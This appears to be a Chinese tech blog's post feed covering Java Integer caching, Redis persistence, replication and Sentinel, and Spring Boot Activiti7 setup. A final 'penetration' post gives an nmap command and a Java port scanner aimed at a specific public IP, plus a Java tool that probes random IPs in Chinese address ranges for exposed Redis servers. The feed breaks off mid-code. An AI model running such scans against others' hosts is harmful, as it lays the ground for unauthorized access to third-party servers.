class="line">40&#x3D;i5+i6   true</span><br></pre></td></tr></table></figure><p>解释：</p><p>语句 i4 == i5 + i6，因为+这个操作符不适用于 Integer 对象，首先 i5 和 i6 进行自动拆箱操作，进行数值相加，即 i4 == 40。然后 Integer 对象无法与数值进行直接比较，所以 i4 自动拆箱转为 int 值 40，最终这条语句转为 40 == 40 进行数值比较。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java内存</tag>
      </tags>
  </entry>
  <entry>
    <title>redis基础概念</title>
    <url>/2021/03/01/44296/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><p>Redis(Remote Dictionary Server) 是一个使用 C 语言编写的，开源的（BSD许可）高性能非关系型（NoSQL）的键值对数据库。</p><p>Redis 可以存储键和五种不同类型的值之间的映射。键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。</p><p>与传统数据库不同的是 Redis 的数据是存在内存中的，所以读写速度非常快，因此 redis 被广泛应用于缓存方向，每秒可以处理超过 10万次读写操作，是已知性能最快的Key-Value DB。另外，Redis 也经常用来做分布式锁。除此之外，Redis 支持事务 、持久化、LUA脚本、LRU驱动事件、多种集群方案。</p><a id="more"></a><h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><p>持久化就是把内存的数据写到磁盘中去，防止服务宕机了内存数据丢失，当redis重启后，可以从磁盘中恢复数据。Redis 提供两种持久化机制 RDB（默认） 和 AOF 机制。</p><h2 id="RDB（Redis-DataBase）"><a href="#RDB（Redis-DataBase）" class="headerlink" title="RDB（Redis DataBase）"></a>RDB（Redis DataBase）</h2><p>RDB是Redis默认的持久化方式。按照一定的时间将内存的数据以快照的形式保存到硬盘中，对应产生的数据文件为dump.rdb。通过配置文件中的save参数来定义快照的周期。</p><p><img src="/2021/03/01/44296/RDB.png" alt="1594951904"></p><blockquote><p>优点</p></blockquote><ul><li>RDB是一个非常紧凑的文件,它保存了某个时间点得数据集,非常适用于数据集的备份,比如你可以在每个小时报保存一下过去24小时内的数据,同时每天保存过去30天的数据,这样即使出了问题你也可以根据需求恢复到不同版本的数据集.</li><li>RDB是一个紧凑的单一文件,很方便传送到另一个远端数据中心或者亚马逊的S3（可能加密），非常适用于灾难恢复.</li><li>RDB在保存RDB文件时父进程唯一需要做的就是fork出一个子进程,接下来的工作全部由子进程来做，父进程不需要再做其他IO操作，所以RDB持久化方式可以最大化redis的性能.</li><li>与AOF相比,在恢复大的数据集的时候，RDB方式会更快一些.</li></ul><blockquote><p>缺点</p></blockquote><ul><li>如果你希望在redis意外停止工作（例如电源中断）的情况下丢失的数据最少的话，那么RDB不适合你.虽然你可以配置不同的save时间点(例如每隔5分钟并且对数据集有100个写的操作),是Redis要完整的保存整个数据集是一个比较繁重的工作,你通常会每隔5分钟或者更久做一次完整的保存,万一在Redis意外宕机,你可能会丢失几分钟的数据.</li><li>RDB 需要经常fork子进程来保存数据集到硬盘上,当数据集比较大的时候,fork的过程是非常耗时的,可能会导致Redis在一些毫秒级内不能响应客户端的请求.如果数据集巨大并且CPU性能不是很好的情况下,这种情况会持续1秒,AOF也需要fork,但是你可以调节重写日志文件的频率来提高数据集的耐久度.</li></ul><h2 id="AOF（Append-Only-File）"><a href="#AOF（Append-Only-File）" class="headerlink" title="AOF（Append Only File）"></a>AOF（Append Only File）</h2><p><img src="/2021/03/01/44296/AOF.png" alt="1594951904"></p><p>AOF持久化方式记录每次对服务器写的操作,当服务器重启的时候会重新执行这些命令来恢复原始的数据,AOF命令以redis协议追加保存每次写的操作到文件末尾.Redis还能对AOF文件进行后台重写,使得AOF文件的体积不至于过大.<br>如果你只希望你的数据在服务器运行的时候存在,你也可以不使用任何持久化方式.<br>你也可以同时开启两种持久化方式, 在这种情况下, 当redis重启的时候会优先载入AOF文件来恢复原始的数据,因为在通常情况下AOF文件保存的数据集要比RDB文件保存的数据集要完整.</p><blockquote><p>优点</p></blockquote><ul><li>使用AOF 会让你的Redis更加耐久: 你可以使用不同的fsync策略：无fsync,每秒fsync,每次写的时候fsync.使用默认的每秒fsync策略,Redis的性能依然很好(fsync是由后台线程进行处理的,主线程会尽力处理客户端请求),一旦出现故障，你最多丢失1秒的数据.</li><li>AOF文件是一个只进行追加的日志文件,所以不需要写入seek,即使由于某些原因(磁盘空间已满，写的过程中宕机等等)未执行完整的写入命令,你也也可使用redis-check-aof工具修复这些问题.</li><li>Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。</li><li>AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。</li></ul><blockquote><p>缺点</p></blockquote><ul><li>对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。</li><li>根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。</li></ul><h1 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h1><p>​ 为了避免单点故障，通常的做法是将数据库复制多个副本以部署在不同的服务器上，这样即使有一台服务器出现故障，其他服务器依然可以继续提供服务。为此， <strong>Redis 提供了复制（replication）功能，可以实现当一台数据库中的数据更新后，自动将更新的数据同步到其他数据库上</strong>。</p><p>​ 在复制的概念中，数据库分为两类，一类是主数据库（master），另一类是从数据库(slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而<strong>从数据库一般是只读的，并接受主数据库同步过来的数据</strong>。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。</p><h2 id="主从同步"><a href="#主从同步" class="headerlink" title="主从同步"></a>主从同步</h2><p><img src="/2021/03/01/44296/1.jpg" alt="1594951904"></p><p>​ 主数据库不用配置，从数据库的配置文件（redis.conf）中可以加载主数据库的信息，也可以在启动时，使用 redis-server –port 6380 –slaveof 127.0.0.1 6379 命令指明主数据库的 IP 和端口。从数据库一般是只读，可以改为可写，但写入的数据很容易被主同步没，所以还是只读就可以。</p><p>​ 也可在配置文件中指定</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 指定主服务器</span></span><br><span class="line">slaveof 127.0.0.1 6379</span><br><span class="line"><span class="meta">#</span><span class="bash"> 主服务器密码</span></span><br><span class="line">masterauth 123456</span><br></pre></td></tr></table></figure><p><img src="/2021/03/01/44296/2.png" alt></p><ul><li>从数据库连接主数据库，发送SYNC命令；</li><li>主数据库接收到SYNC命令后，开始执行BGSAVE命令生成RDB文件并使用缓冲区记录此后执行的所有写命令；</li><li>主数据库BGSAVE执行完后，向所有从数据库发送快照文件，并在发送期间继续记录被执行的写命令；</li><li>从数据库收到快照文件后丢弃所有旧数据，载入收到的快照；</li><li>主数据库快照发送完毕后开始向从数据库发送缓冲区中的写命令；</li><li>从数据库完成对快照的载入，开始接收命令请求，并执行来自主数据库缓冲区的写命令；（<strong>从数据库初始化完成</strong>）</li><li>主数据库每执行一个写命令就会向从数据库发送相同的写命令，从数据库接收并执行收到的写命令（<strong>从数据库初始化完成后的操作</strong>）</li><li>出现断开重连后，2.8之后的版本会将断线期间的命令传给重数据库，增量复制。</li><li>主从刚刚连接的时候，进行全量同步；全同步结束后，进行增量同步。当然，如果有需要，slave 在任何时候都可以发起全量同步。Redis 的策略是，无论如何，首先会尝试进行增量同步，如不成功，要求从机进行全量同步。</li></ul><blockquote><p>优点：</p></blockquote><ul><li>支持主从复制，主机会自动将数据同步到从机，可以进行读写分离；</li><li>为了分载Master的读操作压力，Slave服务器可以为客户端提供只读操作的服务，写服务仍然必须由Master来完成；</li><li>Slave同样可以接受其它Slaves的连接和同步请求，这样可以有效的分载Master的同步压力；</li><li>Master Server是以非阻塞的方式为Slaves提供服务。所以在Master-Slave同步期间，客户端仍然可以提交查询或修改请求；</li><li>Slave Server同样是以非阻塞的方式完成数据同步。在同步期间，如果有客户端提交查询请求，Redis则返回同步之前的数据；</li></ul><blockquote><p>缺点：</p></blockquote><ul><li>Redis不具备自动容错和恢复功能，主机从机的宕机都会导致前端部分读写请求失败，需要等待机器重启或者手动切换前端的IP才能恢复；</li><li>主机宕机，宕机前有部分数据未能及时同步到从机，切换IP后还会引入数据不一致的问题，降低了系统的可用性；</li><li>如果多个Slave断线了，需要重启的时候，尽量不要在同一时间段进行重启。因为只要Slave启动，就会发送sync请求和主机全量同步，当多个 Slave 重启的时候，可能会导致 Master IO剧增从而宕机。</li><li>Redis较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂；</li></ul><blockquote><p>问题</p></blockquote><ul><li><p>从库宕机</p><p>重启从库即可</p></li><li><p>主库宕机</p><p>选择一个从库作为主库，其他从库选择新的主库</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 连接从库</span></span><br><span class="line">[root@localhost redis-4.0.12]# redis-cli -p 6380</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 取消从库身份</span></span><br><span class="line">127.0.0.1:6380&gt; slaveof no one</span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接从库</span></span><br><span class="line">[root@localhost redis-4.0.12]# redis-cli -p 6381</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重新设置从库</span></span><br><span class="line">127.0.0.1:6381&gt; slaveof 127.0.0.1 6380</span><br></pre></td></tr></table></figure><h2 id="哨兵模式"><a href="#哨兵模式" class="headerlink" title="哨兵模式"></a>哨兵模式</h2><p>​ 主从同步模式下，当主服务器宕机后，需要手动把一台从服务器切换为主服务器，这就需要人工干预，费事费力，还会造成一段时间内服务不可用。这不是一种推荐的方式，更多时候，我们优先考虑哨兵模式。</p><p>　　哨兵模式是一种特殊的模式，首先Redis提供了哨兵的命令，哨兵是一个独立的进程，作为进程，它会独立运行。其原理是哨兵通过发送命令，等待Redis服务器响应，从而监控运行的多个Redis实例。</p><p><img src="/2021/03/01/44296/3.png" alt></p><blockquote><p>哨兵模式的作用：</p></blockquote><ul><li>通过发送命令，让Redis服务器返回监控其运行状态，包括主服务器和从服务器；</li><li>当哨兵监测到master宕机，会自动将slave切换成master，然后通过<strong>发布订阅模式</strong>通知其他的从服务器，修改配置文件，让它们切换主机；</li></ul><p>然而一个哨兵进程对Redis服务器进行监控，也可能会出现问题，为此，我们可以使用多个哨兵进行监控。各个哨兵之间还会进行监控，这样就形成了多哨兵模式。</p><p><img src="/2021/03/01/44296/4.png" alt="img"></p><blockquote><p>故障切换的过程：</p></blockquote><p>　　假设主服务器宕机，哨兵1先检测到这个结果，系统并不会马上进行 failover 过程，仅仅是哨兵1主观的认为主服务器不可用，这个现象成为<strong>主观下线</strong>。当后面的哨兵也检测到主服务器不可用，并且数量达到一定值时，那么哨兵之间就会进行一次投票，投票的结果由一个哨兵发起，进行 failover 操作。切换成功后，就会通过发布订阅模式，让各个哨兵把自己监控的从服务器实现切换主机，这个过程称为<strong>客观下线</strong>。这样对于客户端而言，一切都是透明的。</p><blockquote><p>哨兵模式的配置：</p></blockquote><p>配置一主二从和三个哨兵的 Redis 服务器来演示这个过程</p><table><thead><tr><th>服务类型</th><th>是否为主服务器</th><th>ip</th><th>端口</th></tr></thead><tbody><tr><td>Redis</td><td>是</td><td>127.0.0.1</td><td>6379</td></tr><tr><td>Redis</td><td>否</td><td>127.0.0.1</td><td>6380</td></tr><tr><td>Redis</td><td>否</td><td>127.0.0.1</td><td>6381</td></tr><tr><td>Sentinel</td><td></td><td>127.0.0.1</td><td>26379</td></tr><tr><td>Sentinel</td><td></td><td>127.0.0.1</td><td>26380</td></tr><tr><td>Sentinel</td><td></td><td>127.0.0.1</td><td>26381</td></tr></tbody></table><p>主从redis服务器按照主从同步配置，哨兵服务器配置如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 禁止保护模式</span></span><br><span class="line">protected-mode no</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置监听的主服务器，这里sentinel monitor代表监控，mymaster代表服务器的名称，可以自定义，127.0.0.1代表监控的主服务器，6379代表端口，2代表只有两个或两个以上的哨兵认为主服务器不可用的时候，才会进行failover操作。</span></span><br><span class="line">sentinel monitor mymaster 127.0.0.1 6379 2</span><br><span class="line"><span class="meta">#</span><span class="bash"> sentinel author-pass定义服务的密码，mymaster是服务名称，123456是Redis服务器密码</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sentinel auth-pass &lt;master-name&gt; &lt;password&gt;</span></span><br><span class="line">sentinel auth-pass mymaster 123456</span><br></pre></td></tr></table></figure><p>配置3个哨兵，每个哨兵的配置都是一样的。在Redis安装目录下有一个sentinel.conf文件，copy一份进行修改，执行</p><p><strong>./redis-server.sh sentinel.conf –sentinel</strong> 启动。</p><blockquote><p>启动</p></blockquote><p>注意启动的顺序。首先是主机的 Redis 服务进程，然后启动从机的 Redis 服务进程，最后启动3个哨兵的服务进程。</p><blockquote><p>哨兵模式的工作方式：</p></blockquote><ul><li>每个Sentinel（哨兵）进程以每秒钟一次的频率向整个集群中的Master主服务器，Slave从服务器以及其他Sentinel（哨兵）进程发送一个 PING 命令。</li><li>如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过 down-after-milliseconds 选项所指定的值， 则这个实例会被 Sentinel（哨兵）进程标记为主观下线（SDOWN）</li><li>如果一个Master主服务器被标记为主观下线（SDOWN），则正在监视这个Master主服务器的所有 Sentinel（哨兵）进程要以每秒一次的频率确认Master主服务器的确进入了主观下线状态</li><li>当有足够数量的 Sentinel（哨兵）进程（大于等于配置文件指定的值）在指定的时间范围内确认Master主服务器进入了主观下线状态（SDOWN）， 则Master主服务器会被标记为客观下线（ODOWN）</li><li>在一般情况下， 每个 Sentinel（哨兵）进程会以每 10 秒一次的频率向集群中的所有Master主服务器、Slave从服务器发送 INFO 命令。</li><li>当Master主服务器被 Sentinel（哨兵）进程标记为客观下线（ODOWN）时，Sentinel（哨兵）进程向下线的 Master主服务器的所有 Slave从服务器发送 INFO 命令的频率会从 10 秒一次改为每秒一次。</li><li>若没有足够数量的 Sentinel（哨兵）进程同意 Master主服务器下线， Master主服务器的客观下线状态就会被移除。若 Master主服务器重新向 Sentinel（哨兵）进程发送 PING 命令返回有效回复，Master主服务器的主观下线状态就会被移除。</li></ul><blockquote><p>优点：</p></blockquote><ul><li>哨兵模式是基于主从模式的，所有主从的优点，哨兵模式都具有。</li><li>主从可以自动切换，系统更健壮，可用性更高。</li></ul><blockquote><p>缺点：</p></blockquote><ul><li>Redis较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂。</li><li>当master挂掉的时候，sentinel 会选举出来一个 master，选举的时候是没有办法去访问Redis的，会存在<strong>访问瞬断</strong>的情况；若是在电商网站大促的时候master给挂掉了，几秒钟损失好多订单数据；</li><li>哨兵模式，对外<strong>只有master节点可以写，slave节点只能用于读</strong>。尽管Redis单节点最多支持10W的QPS，但是在电商大促的时候，写数据的压力全部在master上。</li><li>Redis的单节点内存不能设置过大，若数据过大在主从同步将会很慢；在节点启动的时候，时间特别长；（从节点上有主节点的所有数据）</li></ul><h2 id="Cluster-集群"><a href="#Cluster-集群" class="headerlink" title="Cluster 集群"></a>Cluster 集群</h2><!-- rebuild by neat -->]]></content>
      <categories>
        <category>缓存</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>spring常见注解</title>
    <url>/2021/01/12/22702/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><!-- rebuild by neat -->]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot整合activiti7</title>
    <url>/2020/09/09/29996/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><p>就springboot整合activiti7踩坑情况做一简单记录</p><a id="more"></a><h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>项目环境是springboot+mybatis-plus+shiro，数据库使用mysql8.0版本</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.activiti<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>activiti-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.1.0.M1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">activiti:</span></span><br><span class="line">    <span class="attr">db-history-used:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">history-level:</span> <span class="string">full</span></span><br><span class="line">    <span class="attr">database-schema-update:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#mysql版本为8.0以上，配置文件jdbc加上&amp;nullCatalogMeansCurrent=true</span></span><br></pre></td></tr></table></figure><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>项目原本有配置线程池，并交由spring管理，与activiti内部默认的线程池配置冲突</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Primary;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.AsyncConfigurerSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadPoolExecutor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AsyncExecutorPoolConfig</span> <span class="keyword">extends</span> <span class="title">AsyncConfigurerSupport</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line"><span class="comment">//    public Executor taskExecutor() &#123;</span></span><br><span class="line"><span class="comment">//    将Executor更改为ThreadPoolTaskExecutor，并加@Primary注解以优先使用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ThreadPoolTaskExecutor <span class="title">taskExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ThreadPoolTaskExecutor executor = <span class="keyword">new</span> ThreadPoolTaskExecutor();</span><br><span class="line"></span><br><span class="line">        executor.setCorePoolSize(<span class="number">5</span>);</span><br><span class="line">        executor.setMaxPoolSize(<span class="number">20</span>);</span><br><span class="line">        executor.setQueueCapacity(<span class="number">100</span>);</span><br><span class="line">        executor.setKeepAliveSeconds(<span class="number">30</span>);</span><br><span class="line">        executor.setThreadNamePrefix(<span class="string">"asyncTaskExecutor-"</span>);</span><br><span class="line"></span><br><span class="line">        executor.setRejectedExecutionHandler(<span class="keyword">new</span> ThreadPoolExecutor.CallerRunsPolicy());</span><br><span class="line">        <span class="keyword">return</span> executor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>activiti</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透-扫描端口</title>
    <url>/2020/08/26/64800/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT 103.147.13.182</span><br></pre></td></tr></table></figure><p>或者一段简单的代码</p><a id="more"></a><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AA</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">65535</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">65535</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> finalI = i;</span><br><span class="line">            Callable&lt;Integer&gt; task = () -&gt; &#123;</span><br><span class="line">                <span class="keyword">boolean</span> hostConnectable = isHostConnectable(<span class="string">"103.147.13.182"</span>, finalI);</span><br><span class="line">                <span class="keyword">if</span> (hostConnectable)&#123;</span><br><span class="line">                    System.out.println(finalI);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> finalI;</span><br><span class="line">            &#125;;</span><br><span class="line">            Future&lt;Integer&gt; future = executorService.submit(task);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Integer s = future.get(<span class="number">1</span>, TimeUnit.MICROSECONDS);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"======================"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isHostConnectable</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            socket.connect(<span class="keyword">new</span> InetSocketAddress(host, port));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ignored) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="扫描随机可用redis"><a href="#扫描随机可用redis" class="headerlink" title="扫描随机可用redis"></a>扫描随机可用redis</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># 添加maven依赖</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"># 简单代码</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BB</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">100000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">            executorService.execute(() -&gt; connectRedis(getRandomIp()));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"======================"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">connectRedis</span><span class="params">(String ip)</span></span>&#123;</span><br><span class="line">        Jedis jedis=<span class="keyword">new</span> Jedis(ip,<span class="number">6379</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String pong = jedis.ping();</span><br><span class="line">            System.out.println(ip);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"NOAUTH Authentication required."</span>.equals(e.getMessage()))&#123;</span><br><span class="line">                System.out.println(ip+<span class="string">"============没有密码"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 随机生成国内IP地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getRandomIp</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ip范围</span></span><br><span class="line">        <span class="keyword">int</span>[][] range = &#123; &#123; <span class="number">607649792</span>, <span class="number">608174079</span> &#125;,<span class="comment">// 36.56.0.0-36.63.255.255</span></span><br><span class="line">                &#123; <span class="number">1038614528</span>, <span class="number">1039007743</span> &#125;,<span class="comment">// 61.232.0.0-61.237.255.255</span></span><br><span class="line">                &#123; <span class="number">1783627776</span>, <span class="number">1784676351</span> &#125;,<span class="comment">// 106.80.0.0-106.95.255.255</span></span><br><span class="line">                &#123; <span class="number">2035023872</span>, <span class="number">2035154943</span> &#125;,<span class="comment">// 121.76.0.0-121.77.255.255</span></span><br><span class="line">                &#123; <span class="number">2078801920</span>, <span class="number">2079064063</span> &#125;,<span class="comment">// 123.232.0.0-123.235.255.255</span></span><br><span class="line">                &#123; -<span class="number">1950089216</span>, -<span class="number">1948778497</span> &#125;,<span class="comment">// 139.196.0.0-139.215.255.255</span></span><br><span class="line">                &#123; -<span class="number">1425539072</span>, -<span class="number">1425014785</span> &#125;,<span class="comment">// 171.8.0.0-171.15.255.255</span></span><br><span class="line">                &#123; -<span class="number">1236271104</span>, -<span class="number">1235419137</span> &#125;,<span class="comment">// 182.80.0.0-182.92.255.255</span></span><br><span class="line">                &#123; -<span class="number">770113536</span>, -<span class="number">768606209</span> &#125;,<span class="comment">// 210.25.0.0-210.47.255.255</span></span><br><span class="line">                &#123; -<span class="number">569376768</span>, -<span class="number">564133889</span> &#125;, <span class="comment">// 222.16.0.0-222.95.255.255</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Random rdint = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">int</span> index = rdint.nextInt(<span class="number">10</span>);</span><br><span class="line">        String ip = num2ip(range[index][<span class="number">0</span>] + <span class="keyword">new</span> Random().nextInt(range[index][<span class="number">1</span>] - range[index][<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> ip;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 将十进制转换成ip地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">num2ip</span><span class="params">(<span class="keyword">int</span> ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[<span 